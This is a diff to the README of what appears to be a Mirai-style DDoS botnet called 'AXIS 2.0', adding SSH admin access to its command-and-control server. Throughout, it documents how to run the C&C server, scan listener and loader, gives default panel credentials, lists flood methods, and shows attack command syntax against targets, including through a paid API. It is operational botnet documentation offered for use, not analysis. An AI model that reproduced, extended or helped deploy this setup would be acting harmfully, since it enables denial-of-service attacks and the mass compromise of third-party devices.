@@ -161,6 +161,35 @@ vse, dns, greip, greeth, homeslam, udpbypass, mixed
 
 ## 📋 Admin Panel Commands
 
+### Connecting via SSH (Recommended)
+
+**AXIS 2.0 now supports secure SSH connections for admin access!**
+
+```bash
+# Connect via SSH (default port 2222)
+ssh -p 2222 admin@YOUR_SERVER_IP
+
+# Or with custom SSH port
+ssh admin@YOUR_SERVER_IP -p 2222
+```
+
+**Benefits of SSH over Telnet:**
+- ✅ Encrypted connection (no plaintext credentials)
+- ✅ Better security with key-based auth support
+- ✅ Terminal features (scrollback, copy/paste)
+- ✅ Session persistence with tmux/screen
+
+### Connecting via Telnet (Legacy)
+
+```bash
+telnet YOUR_SERVER_IP 3778
+Secret: AXIS20
+Username: admin
+Password: admin123
+```
+
+### Commands
+
 ```
 HELP       - Show command menu (zinnet-style)
 METHODS    - Show attack methods (organized by L3/L4/L7/Special)
@@ -171,7 +200,7 @@ INFO       - User information
 ADMIN      - Admin commands (admins only)
 TOOLS      - Network tools menu
 CLEAR      - Clear screen
-LOGOUT     - Logout
+LOGOUT     - Logout (or type 'exit'/'quit')
 
 Attack Format: <method> <target> <duration> dport=<port>
 Example: udpplain 1.2.3.4 30 dport=80
@@ -308,8 +337,10 @@ const DatabaseAddr string = "127.0.0.1:3306"
 const DatabaseUser string = "root"
 const DatabasePass string = "YOUR_PASSWORD"
 const DatabaseTable string = "AXIS2"
-const CNCListenAddr string = "0.0.0.0:3778"
-const APIListenAddr string = "0.0.0.0:3779"
+const CNCListenAddr string = "0.0.0.0:3778"     // Bot connections (telnet protocol)
+const SSHListenAddr string = "0.0.0.0:2222"     // Admin SSH connections
+const SSHHostKeyPath string = "ssh_host_key"    // Auto-generated SSH host key
+const APIListenAddr string = "0.0.0.0:3779"     // REST API
 ```
 
 **bot/config.h:**
@@ -335,9 +366,14 @@ chmod +x build.sh
 ### 5. Run
 
 ```bash
-# Terminal 1: C&C Server
+# Terminal 1: C&C Server (handles bot connections + SSH admin access)
 cd "AXIS 2.0"
 ./cnc_server
+
+# The C&C server will now:
+# - Listen on port 3778 for bot connections
+# - Listen on port 2222 for SSH admin connections (NEW!)
+# - Listen on port 3779 for API connections (if enabled)
 
 # Terminal 2: Scan Listener
 ./scanListen
@@ -346,11 +382,32 @@ cd "AXIS 2.0"
 ./loader < list.txt
 ```
 
+**Note:** On first run, the C&C server will automatically generate an SSH host key file (`ssh_host_key`).
+
 ---
 
 ## 📖 Usage Guide
 
-### Connecting to Admin Panel
+### Connecting to Admin Panel via SSH (Recommended)
+
+```bash
+# First-time connection (you'll see a key fingerprint)
+ssh -p 2222 admin@YOUR_SERVER_IP
+# Type 'yes' to accept the host key
+
+# Enter your database username and password when prompted
+```
+
+**First Time SSH Connection:**
+When you connect for the first time, SSH will show a fingerprint like:
+```
+The authenticity of host '[YOUR_SERVER_IP]:2222' can't be established.
+RSA key fingerprint is SHA256:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.
+Are you sure you want to continue connecting (yes/no/[fingerprint])?
+```
+Type `yes` to accept and continue.
+
+### Connecting via Telnet (Legacy - Not Recommended)
 
 ```bash
 telnet YOUR_SERVER_IP 3778
@@ -358,6 +415,8 @@ Secret: AXIS20
 Username: admin
 Password: admin123
 ```
+
+⚠️ **Warning:** Telnet sends credentials in plaintext. Use SSH for security!
 
 ### Launching Attacks
 
@@ -449,6 +508,25 @@ AXIS2-ADMIN-APIKEY|-100 udp 1.2.3.4 30 dport=80
 ---
 
 ## 🔍 Troubleshooting
+
+### SSH Connection Issues
+
+**SSH connection refused:**
+1. Check SSH port is listening: `netstat -tlnp | grep 2222`
+2. Verify firewall allows SSH: `ufw allow 2222/tcp`
+3. Check C&C server logs for SSH startup messages
+4. Ensure port 2222 is not used by another service
+
+**SSH host key issues:**
+```bash
+# If you get "REMOTE HOST IDENTIFICATION HAS CHANGED"
+ssh-keygen -R "[YOUR_SERVER_IP]:2222"
+```
+
+**Can't login via SSH:**
+1. Verify username exists in database: `mysql -e "SELECT * FROM users WHERE username='admin'" AXIS2`
+2. Check password is correct
+3. Ensure account is not expired (check `last_paid` and `intvl` fields)
 
 ### Bot Won't Connect
 1. Check C&C address in `bot/config.h`
